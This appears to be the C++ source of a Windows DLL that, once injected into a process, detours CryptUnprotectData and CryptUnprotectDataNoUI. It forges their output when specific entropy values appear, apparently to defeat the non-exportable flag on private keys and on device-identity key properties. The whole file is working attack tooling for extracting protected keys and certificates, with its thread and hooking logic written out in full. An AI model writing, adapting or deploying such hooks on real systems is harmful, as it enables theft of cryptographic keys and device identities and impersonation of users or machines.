
#include "stdafx.h"
#include "../../lib/inc/initterm.h"

namespace NT {
#include "../detour/detour.h"
};

using namespace NT;

EXTERN_C_START 

extern PVOID __imp_CryptUnprotectData, __imp_CryptUnprotectDataNoUI;

// CryptUnprotectDataNoUI declared in dpapi.h without DPAPI_IMP !!
WINBASEAPI
BOOL
WINAPI
CryptUnprotectDataNoUI(
	_In_            DATA_BLOB* pDataIn,             // in encr blob
	_Outptr_opt_result_maybenull_ LPWSTR* ppszDataDescr,       // out
	_In_opt_        DATA_BLOB* pOptionalEntropy,
	_Reserved_      PVOID           pvReserved,
	_In_opt_        CRYPTPROTECT_PROMPTSTRUCT* pPromptStruct,
	_In_            DWORD           dwFlags,
	_In_reads_bytes_opt_(cbOptionalPassword) const BYTE* pbOptionalPassword,
	DWORD           cbOptionalPassword,
	_Out_           DATA_BLOB* pDataOut
);

EXTERN_C_END

//
// UnprotectExportabilityFlag
// https://github.com/wisny101/Windows-Server-2003-Source/blob/master/ds/win32/ntcrypto/contman/contman.c#L1087
//

BOOL WINAPI hook_CryptUnprotectData(
									_In_            DATA_BLOB*      pDataIn,             // in encr blob
									_Outptr_opt_result_maybenull_ LPWSTR*     ppszDataDescr,       // out
									_In_opt_        DATA_BLOB*      pOptionalEntropy,
									_Reserved_      PVOID           pvReserved,
									_In_opt_        CRYPTPROTECT_PROMPTSTRUCT*  pPromptStruct,
									_In_            DWORD           dwFlags,
									_Out_           DATA_BLOB*      pDataOut
									)
{
	static const char STUFF_TO_GO_INTO_MIX[] = "Hj1diQ6kpUx7VC4m";

	if (pOptionalEntropy && pOptionalEntropy->cbData == sizeof(STUFF_TO_GO_INTO_MIX) &&
		!memcmp(pOptionalEntropy->pbData, STUFF_TO_GO_INTO_MIX, sizeof(STUFF_TO_GO_INTO_MIX)))
	{
		if (!(pDataOut->pbData = (PBYTE)LocalAlloc(0, sizeof(BOOL))))
			return FALSE;

		*(BOOL*)pDataOut->pbData = TRUE;
		pDataOut->cbData = sizeof(BOOL);

		return TRUE;
	}

	return CryptUnprotectData(pDataIn, ppszDataDescr, pOptionalEntropy, pvReserved, pPromptStruct, dwFlags, pDataOut);
}

//
// https://o365blog.com/post/deviceidentity/
//

BOOL WINAPI hook_CryptUnprotectDataNoUI(
										_In_            DATA_BLOB*      pDataIn,             // in encr blob
										_Outptr_opt_result_maybenull_ LPWSTR*     ppszDataDescr,       // out
										_In_opt_        DATA_BLOB*      pOptionalEntropy,
										_Reserved_      PVOID           pvReserved,
										_In_opt_        CRYPTPROTECT_PROMPTSTRUCT*  pPromptStruct,
										_In_            DWORD           dwFlags,
										_In_reads_bytes_opt_(cbOptionalPassword)
										const BYTE      *pbOptionalPassword,
										DWORD           cbOptionalPassword,
										_Out_           DATA_BLOB*      pDataOut
										)
{
	static const char DPAPI_ENTROPY_CNG_KEY_PROPERTIES[] = "6jnkd5J3ZdQDtrsu";

	if (pOptionalEntropy && pOptionalEntropy->cbData == sizeof(DPAPI_ENTROPY_CNG_KEY_PROPERTIES) &&
		!memcmp(pOptionalEntropy->pbData, DPAPI_ENTROPY_CNG_KEY_PROPERTIES, sizeof(DPAPI_ENTROPY_CNG_KEY_PROPERTIES)))
	{
		static const ULONG64 xx[] = {
			0x0000000300000032,  //2.......
			0x0000001a00000000,  //........
			0x0078004500000004,  //....E.x.
			0x00740072006f0070,  //p.o.r.t.
			0x006c006f00500020,  // .P.o.l.
			0x0003007900630069,  //i.c.y...
			0x0000000000000000
		};

		if (!(pDataOut->pbData = (PBYTE)LocalAlloc(0, 0x32)))
			return FALSE;

		memcpy(pDataOut->pbData, xx, 0x32);
		pDataOut->cbData = 0x32;

		return TRUE;
	}

	return CryptUnprotectDataNoUI(pDataIn, ppszDataDescr, pOptionalEntropy, pvReserved, 
		pPromptStruct, dwFlags, pbOptionalPassword, cbOptionalPassword,pDataOut);
}

ULONG WINAPI HookThread(PVOID hModule)
{
	if (HANDLE hEvent = OpenEventW(SYNCHRONIZE, FALSE, L"Global\\{4135488E-6D52-4ca2-BF4C-F5409E3214E2}"))
	{
		initterm();

		if (0 <= TrInit())
		{
			T_HOOK_ENTRY entry[] = {
				{ &__imp_CryptUnprotectData, hook_CryptUnprotectData },
				{ &__imp_CryptUnprotectDataNoUI, hook_CryptUnprotectDataNoUI }
			};

			ThreadInfo* pti = 0;

			if (0 <= SuspendAll(&pti))
			{
				TrHook(entry, _countof(entry), pti);
				ResumeAndFree(pti);
			}

			WaitForSingleObject(hEvent, INFINITE);

			if (0 <= SuspendAll(&pti))
			{
				TrUnHook(entry, _countof(entry), pti);
				ResumeAndFree(pti);
			}
		}

		destroyterm();

		CloseHandle(hEvent);
	}

	FreeLibraryAndExitThread((HMODULE)hModule, 0);
}

#include "FileName.h"

BOOLEAN APIENTRY DllMain( HMODULE hModule, DWORD  ul_reason_for_call, PVOID)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		DisableThreadLibraryCalls(hModule);
		return 0 <= RtlCreateUserThread(NtCurrentProcess(), 0, FALSE, 0, 0, 0, HookThread, hModule, 0, 0);
	}
	return TRUE;
}
